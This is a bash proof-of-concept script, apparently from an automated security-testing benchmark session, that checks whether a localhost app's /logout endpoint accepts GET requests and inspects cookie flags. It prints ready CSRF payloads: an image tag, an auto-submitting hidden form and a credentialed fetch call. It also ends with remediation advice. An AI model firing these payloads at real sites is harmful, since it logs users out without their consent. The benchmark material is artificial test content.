#!/bin/bash
# POC: Simplified POC that demonstrates CSRF vulnerability by testing if /logout endpoint accepts GET requests. Shows allowed HTTP methods and HTML attack vectors.
# Target: ./repo
# Created: 2025-11-10T14:43:33.480Z
# Session: benchmark-XBEN-024-24-mht8yjhk

# CSRF Attack via GET-based Logout Endpoint POC - Version 2
# This script demonstrates the CSRF vulnerability in the /logout endpoint
# Simplified version that directly tests the GET logout vulnerability

TARGET="${1:-http://localhost:3000}"

echo "========================================"
echo "CSRF Logout GET Request POC - v2"
echo "========================================"
echo "Target: $TARGET"
echo ""

# Step 1: Test if /logout accepts GET requests
echo "[*] Step 1: Testing if /logout endpoint accepts GET requests..."
echo "[*] Sending: GET /logout"

RESPONSE=$(curl -s -i -X GET "$TARGET/logout" 2>&1)

# Check for successful response
if echo "$RESPONSE" | head -1 | grep -qE "HTTP/1\.[01] (200|302|303|307)"; then
  echo "[+] SUCCESS: /logout accepts GET requests!"
  echo "[+] Response:"
  echo "$RESPONSE" | head -5
  
  # Check if session cookie is cleared
  if echo "$RESPONSE" | grep -qi "Set-Cookie.*session"; then
    echo ""
    echo "[+] VULNERABILITY CONFIRMED: Session cookie manipulation via GET"
    CSRF_VULN=1
  fi
else
  echo "[-] Unexpected response:"
  echo "$RESPONSE" | head -10
  exit 1
fi

# Step 2: Test OPTIONS method to show allowed methods
echo ""
echo "[*] Step 2: Checking allowed HTTP methods via OPTIONS..."
echo "[*] Sending: OPTIONS /logout"

OPTIONS=$(curl -s -i -X OPTIONS "$TARGET/logout" 2>&1)

if echo "$OPTIONS" | grep -qi "Allow.*GET"; then
  echo "[+] Allow header confirms GET is permitted:"
  echo "$OPTIONS" | grep -i "Allow"
  CSRF_VULN=1
elif echo "$OPTIONS" | grep -qi "Access-Control-Allow-Methods.*GET"; then
  echo "[+] CORS header confirms GET is permitted:"
  echo "$OPTIONS" | grep -i "Access-Control-Allow-Methods"
  CSRF_VULN=1
fi

# Step 3: Demonstrate HTML-based CSRF payload
echo ""
echo "[*] Step 3: Generating HTML CSRF payload..."
echo "[+] CSRF Attack Vector 1 - Image Tag:"
echo "    <img src='$TARGET/logout' alt='' onerror='alert(\"User logged out\")'>"
echo ""
echo "[+] CSRF Attack Vector 2 - Hidden Form:"
cat << 'HTMLEOF'
    <form id="csrf" action="$TARGET/logout" method="GET" style="display:none;">
      <input type="submit" value="Submit">
    </form>
    <script>document.getElementById('csrf').submit();</script>
HTMLEOF
echo ""
echo "[+] CSRF Attack Vector 3 - Fetch Request:"
echo "    fetch('$TARGET/logout', {method: 'GET', credentials: 'include'})"
echo ""

# Step 4: Check for CSRF protections
echo "[*] Step 4: Checking for CSRF protections..."

# Check for CSRF token requirement
echo "[*] Checking if CSRF token is required..."
GET_RESPONSE=$(curl -s "$TARGET/logout")

if echo "$GET_RESPONSE" | grep -qi "csrf\|token\|nonce"; then
  echo "[!] Possible CSRF protection detected"
  CSRF_PROT=1
else
  echo "[+] No CSRF token requirement detected in response"
fi

# Step 5: Check cookie attributes
echo ""
echo "[*] Step 5: Checking session cookie attributes..."
COOKIE_RESPONSE=$(curl -s -i "$TARGET/logout" 2>&1)

if echo "$COOKIE_RESPONSE" | grep -qi "SameSite"; then
  echo "[+] SameSite attribute is set"
  echo "$COOKIE_RESPONSE" | grep -i "SameSite"
else
  echo "[-] SameSite attribute is MISSING - CSRF vulnerability increased"
fi

if echo "$COOKIE_RESPONSE" | grep -qi "Secure"; then
  echo "[+] Secure flag is set"
else
  echo "[-] Secure flag is MISSING"
fi

if echo "$COOKIE_RESPONSE" | grep -qi "HttpOnly"; then
  echo "[+] HttpOnly flag is set"
else
  echo "[-] HttpOnly flag is MISSING"
fi

# Final verdict
echo ""
echo "========================================"
if [ $CSRF_VULN -eq 1 ]; then
  echo "RESULT: CSRF VULNERABILITY CONFIRMED ✓"
  echo "========================================"
  echo "ISSUE: /logout endpoint accepts GET requests"
  echo "IMPACT: Attackers can force logout without user consent"
  echo "REMEDIATION: Accept only POST requests with CSRF token validation"
  exit 0
else
  echo "RESULT: Unable to confirm CSRF vulnerability"
  echo "========================================"
  exit 1
fi